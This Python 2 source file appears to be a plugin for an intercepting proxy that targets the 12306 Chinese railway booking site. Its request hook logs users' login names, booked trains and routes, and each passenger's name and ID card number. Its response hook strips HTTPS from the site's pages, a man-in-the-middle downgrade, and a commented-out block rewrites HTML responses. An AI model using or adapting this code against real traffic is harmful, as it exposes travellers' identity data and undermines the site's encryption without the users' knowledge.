# coding=utf-8

# from urlparse import *
# from cStringIO import StringIO
import zlib, string

from http import * 
from sinorail import * 

def proxy_mangle_request(req):
    host, port = req.getHost()
    if is_12306(req) :
        if req.getMethod() == HTTPRequest.METHOD_POST :
            print "************************************************************"
            print "REQ #%d: POST %s:%d %s" % (req.uid, host, port, req.getPath())
            action = get_12306_action(req)
            reqParams = req.getParams() 
            if action == "loginAction.do" and reqParams['method'] == 'login': 
                print "User name: %s" % reqParams['loginUser.user_name'] 
                print "Password: ******" 
            elif action == "querySingleAction.do" and reqParams["method"] == "submutOrderRequest" :
                print "Train NO: %s" % reqParams["station_train_code"]
                print "From %s (%s) to %s (%s)" % (reqParams["from_station_telecode_name"],
                                                   reqParams["from_station_telecode"],
                                                   reqParams["to_station_name"], 
                                                   reqParams["to_station_telecode"]
                                                   )
                print "Date: %s, departure at %s, arrive at %s" % (reqParams["train_date"], 
                                                                   reqParams["train_start_time"], 
                                                                   reqParams["arrive_time"]
                                                                   )
            elif action == "confirmPassengerAction.do" and reqParams["method"] == "confirmSingleForQueueOrder" :
                print "Train NO: %s" % reqParams["orderRequest.station_train_code"]
                print "From %s (%s) to %s (%s)" % (reqParams["orderRequest.from_station_name"],
                                                   reqParams["orderRequest.from_station_telecode"],
                                                   reqParams["orderRequest.to_station_name"], 
                                                   reqParams["orderRequest.to_station_telecode"]
                                                   )
                print "Date: %s, departure at %s, arrive at %s" % (reqParams["orderRequest.train_date"], 
                                                                   reqParams["orderRequest.start_time"], 
                                                                   reqParams["orderRequest.end_time"]
                                                                   )
                i = 1
                while ("passenger_"+str(i)+"_name") in reqParams :
                    prefix = "passenger_"+str(i)
                    print "Passenger %d: %s, %s, %s" % (i, 
                                                        reqParams[prefix+"_name"],
                                                        reqParams[prefix+"_cardno"],
                                                        seat_type(reqParams[prefix+"_seat"])
                                                        )
                    i = i+1
            elif action == "confirmPassengerAction.do" and reqParams["method"] == "payOrder" :
                isTargetReq = True
                print "Order sequence NO: %s" % reqParams["orderSequence_no"]
                print "Train NO: %s" % reqParams["orderRequest.station_train_code"]
                print "From %s (%s) to %s (%s)" % (reqParams["orderRequest.from_station_name"],
                                                   reqParams["orderRequest.from_station_telecode"],
                                                   reqParams["orderRequest.to_station_name"], 
                                                   reqParams["orderRequest.to_station_telecode"]
                                                   )
                print "Date: %s, departure at %s, arrive at %s" % (reqParams["orderRequest.train_date"], 
                                                                   reqParams["orderRequest.start_time"], 
                                                                   reqParams["orderRequest.end_time"]
                                                                   )
                i = 1
                while ("passenger_"+str(i)+"_name") in reqParams :
                    prefix = "passenger_"+str(i)
                    print "Passenger %d: %s, %s, %s" % (i, 
                                                        reqParams[prefix+"_name"],
                                                        reqParams[prefix+"_cardno"],
                                                        seat_type(reqParams[prefix+"_seat"])
                                                        )
                    i = i+1
            elif action == "myOrderAction.do" and reqParams["method"] == "laterEpay":
                isTargetReq = True 
                print "Order sequence NO: %s" % reqParams["orderSequence_no"]
            # for (k, v) in req.getParams().items() : 
            #     print "\t %s = %s" % (k, v)
            print "************************************************************"
    return req

def proxy_mangle_response(reqres):
    req, res = reqres.request, reqres.response
    if is_12306(req) and not is_target(req) :
        return remove_https(res) 
    else :
        return res.serialize()
    
    # data = StringIO(res.serialize())
    # gzipped, isPage = False, False
    # line = data.readline() 
    # newdata = line 
    # while line != HTTPMessage.EOL :
    #     line = data.readline() 
    #     newdata += line
    #     if line != HTTPMessage.EOL :
    #         sep = line.find(':')
    #         headname, headcont = line[:sep], line[sep+1:].strip().lower()
    #         if headname.strip().lower() == "content-encoding" and headcont.find("gzip") >= 0 :
    #             gzipped = True
    #         if headname.strip().lower() == "content-type" and headcont.find("text/html") >= 0 :
    #             isPage = True
    # if not isPage :
    #     return res.serialize()
    # if res.isChunked() :
    #     chunklen = int(data.readline().strip(), 16)
    #     print "Chunk length: %d" % chunklen
    #     chunk = data.read(chunklen)
    #     if gzipped :
    #         page = zlib.decompress(chunk, 16+zlib.MAX_WBITS)
    #     else : 
    #         page = chunk
    #     parser = RailHttpsParser() 
    #     try :
    #         parser.feed(page) 
    #         if gzipped :
    #             resPage = parser.gzipPage() 
    #         else :
    #             resPage = parser.page
    #         newdata += "%x" % len(resPage) + HTTPMessage.EOL
    #         newdata += resPage + HTTPMessage.EOL
    #         newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
    #     except HTMLParseError as pe :
    #         lines = page.split("\n") 
    #         print "HTMLParseError: %s, at line %d, column %d" % (pe.msg, pe.lineno, pe.offset) 
    #         if pe.lineno > 2 :
    #             i = pe.lineno - 2
    #             for line in lines[pe.lineno-2 : pe.lineno+2] :
    #                 print "%4d: %s" % (i, line)
    #                 i += 1
    #         else: 
    #             i = 0 
    #             for line in lines[0 : pe.lineno+2] :
    #                 print "%4d: %s" % (i, line)
    #                 i += 1
    #         newdata += "%x" % chunklen + HTTPMessage.EOL
    #         newdata += chunk + HTTPMessage.EOL
    #         newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
    # else : 
    #     page = data.read()
    #     parser = RailHttpsParser()
    #     try :
    #         parser.feed(page) 
    #         newdata += parser.page
    #     except HTMLParseError as pe :
    #         lines = page.split("\n") 
    #         print "HTMLParseError: %s, at line %d, column %d" % (pe.msg, pe.lineno, pe.offset) 
    #         if pe.lineno > 2 :
    #             i = pe.lineno - 2
    #             for line in lines[pe.lineno-2 : pe.lineno+2] :
    #                 print "%4d: %s" % (i, line)
    #                 i += 1
    #         else: 
    #             i = 0 
    #             for line in lines[0 : pe.lineno+2] :
    #                 print "%4d: %s" % (i, line)
    #                 i += 1
    #         newdata += page
    # return newdata

